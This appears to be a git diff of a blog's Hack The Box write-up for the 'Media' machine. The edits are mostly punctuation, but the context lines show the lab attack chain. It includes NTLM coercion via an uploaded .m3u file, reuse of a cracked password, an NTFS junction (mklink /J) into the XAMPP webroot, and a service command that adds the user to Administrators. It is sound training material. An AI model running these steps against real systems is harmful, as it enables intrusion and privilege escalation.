@@ -52,7 +52,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-media/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -218,7 +218,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.20348
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2026-06-08T19:29:33+00:00
 </span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</span></span></code></pre></div><p>Three ports: SSH, HTTP on Apache/XAMPP, and RDP. No domain - <code>WORKGROUP: MEDIA</code>, straight workgroup machine. Port 80 is what matters.</p>
+</span></span></code></pre></div><p>Three ports: SSH, HTTP on Apache/XAMPP, and RDP. No domain, <code>WORKGROUP: MEDIA</code>, straight workgroup machine. Port 80 is what matters.</p>
 <h2 id="ntlm-coerce-via-m3u">NTLM Coerce via .m3u</h2>
 <p>Opening the site reveals the attack surface immediately:</p>
 <p><img src="/images/writeups/htb-media/web-promotion-studio-upload-form.png" alt="ProMotion Studio job application page with a file upload form asking for a Windows Media Player compatible video"></p>
@@ -246,14 +246,14 @@ stroke-linejoin="round" class="feather feather-home">
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/media ❯ nxc rdp <span class="nv">$DC</span> -u enox -p <span class="s1">&#39;1234virus@&#39;</span>
 </span></span><span class="line"><span class="cl">RDP         10.129.234.67   <span class="m">3389</span>   MEDIA            <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> or Windows Server <span class="m">2016</span> Build <span class="m">20348</span> <span class="o">(</span>name:MEDIA<span class="o">)</span> <span class="o">(</span>domain:MEDIA<span class="o">)</span> <span class="o">(</span>nla:True<span class="o">)</span>
 </span></span><span class="line"><span class="cl">RDP         10.129.234.67   <span class="m">3389</span>   MEDIA            <span class="o">[</span>+<span class="o">]</span> MEDIA<span class="se">\e</span>nox:1234virus@
-</span></span></code></pre></div><p>RDP didn&rsquo;t cooperate on my end - probably a client issue, not the server. SSH worked fine:</p>
+</span></span></code></pre></div><p>RDP didn&rsquo;t cooperate on my end, probably a client issue, not the server. SSH worked fine:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.20348.4052<span class="o">]</span>
 </span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">enox@MEDIA C:<span class="se">\U</span>sers<span class="se">\e</span>nox&gt;
-</span></span></code></pre></div><p>User flag. The <code>review.ps1</code> sitting in enox&rsquo;s Documents was the script processing the uploads - the same one that sent back enox&rsquo;s hash.</p>
+</span></span></code></pre></div><p>User flag. The <code>review.ps1</code> sitting in enox&rsquo;s Documents was the script processing the uploads, the same one that sent back enox&rsquo;s hash.</p>
 <h2 id="privilege-escalation-junction-symlink-into-xampp-webroot">Privilege Escalation: Junction Symlink into XAMPP Webroot</h2>
-<p>Enumerating the system, two things stand out. First, no other user accounts - just <code>enox</code> and <code>Administrator</code>. Second, XAMPP is installed at <code>C:\xampp</code>:</p>
+<p>Enumerating the system, two things stand out. First, no other user accounts, just <code>enox</code> and <code>Administrator</code>. Second, XAMPP is installed at <code>C:\xampp</code>:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Directory of C:<span class="se">\
 </span></span></span><span class="line"><span class="cl">04/15/2025  09:02 PM    &lt;DIR&gt;          inetpub
 </span></span><span class="line"><span class="cl">05/08/2021  01:20 AM    &lt;DIR&gt;          PerfLogs
@@ -264,7 +264,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">10/02/2023  11:03 AM    &lt;DIR&gt;          xampp
 </span></span></code></pre></div><p><code>C:\xampp\htdocs</code> is the Apache webroot. Looking at the PHP source in <code>index.php</code>, the upload handler derives the destination directory from the form fields:</p>
 <pre tabindex="0"><code>upload destination = C:\Windows\Tasks\Uploads\md5(firstName + lastName + email)
-</code></pre><p>The MD5 is computed from the concatenated form values. It&rsquo;s predictable - you control all three inputs. If you submit <code>kanyo</code>, <code>kanyo</code>, <code>kanyo@me</code>, the upload directory becomes <code>md5(&quot;kanyokanyokanyo@me&quot;)</code> = <code>12c11b14d917e8d8fb03881e5929ff74</code>.</p>
+</code></pre><p>The MD5 is computed from the concatenated form values. It&rsquo;s predictable. You control all three inputs. If you submit <code>kanyo</code>, <code>kanyo</code>, <code>kanyo@me</code>, the upload directory becomes <code>md5(&quot;kanyokanyokanyo@me&quot;)</code> = <code>12c11b14d917e8d8fb03881e5929ff74</code>.</p>
 <p>Here&rsquo;s the exploit: Windows NTFS junctions are directory symlinks. When you create a junction at a path and something writes a file into that path, the file lands inside the junction&rsquo;s target instead. The server creates the upload folder if it doesn&rsquo;t exist, but if a junction is already there, writing into it writes into the target directory.</p>
 <p>Pre-create the junction before the upload:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">enox@MEDIA C:<span class="se">\W</span>indows<span class="se">\T</span>asks&gt;mklink /J <span class="s2">&#34;C:\Windows\Tasks\Uploads\12c11b14d917e8d8fb03881e5929ff74&#34;</span> C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs
@@ -320,7 +320,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Created service <span class="s1">&#39;AAATcb&#39;</span> with <span class="nb">command</span> <span class="s1">&#39;cmd /c net localgroup administrators enox /add&#39;</span>.
 </span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> StartService returned an error, but the <span class="nb">command</span> should have been executed. Check it yourself! Error: The service did not respond to the start or control request in a timely fashion..
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Service deleted successfully.
-</span></span></code></pre></div><p>The error message is expected - the command ran but the short-lived service process doesn&rsquo;t stick around to report success. Log out and back in as enox for the group membership to refresh:</p>
+</span></span></code></pre></div><p>The error message is expected. The command ran but the short-lived service process doesn&rsquo;t stick around to report success. Log out and back in as enox for the group membership to refresh:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">enox@MEDIA C:<span class="se">\U</span>sers<span class="se">\e</span>nox&gt;whoami /groups
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">GROUP INFORMATION
@@ -333,7 +333,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
 </span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers
 </span></span></code></pre></div><p>Administrator access. Root flag.</p>
-<p>The NTLM coerce via .m3u is the thing I&rsquo;d remember from this box. The moment you see &ldquo;compatible with Windows Media Player&rdquo; on a file upload form, that&rsquo;s the attack surface. It shows up anywhere a Windows service processes media files server-side - backup software, transcoding pipelines, media management tools. The WMP automatic authentication behavior is a feature, not a bug, which is why it&rsquo;s so reliable.</p>
+<p>The NTLM coerce via .m3u is the thing I&rsquo;d remember from this box. The moment you see &ldquo;compatible with Windows Media Player&rdquo; on a file upload form, that&rsquo;s the attack surface. It shows up anywhere a Windows service processes media files server-side, backup software, transcoding pipelines, media management tools. The WMP automatic authentication behavior is a feature, not a bug, which is why it&rsquo;s so reliable.</p>
 
             </div>
         </article></main>
@@ -458,6 +458,11 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
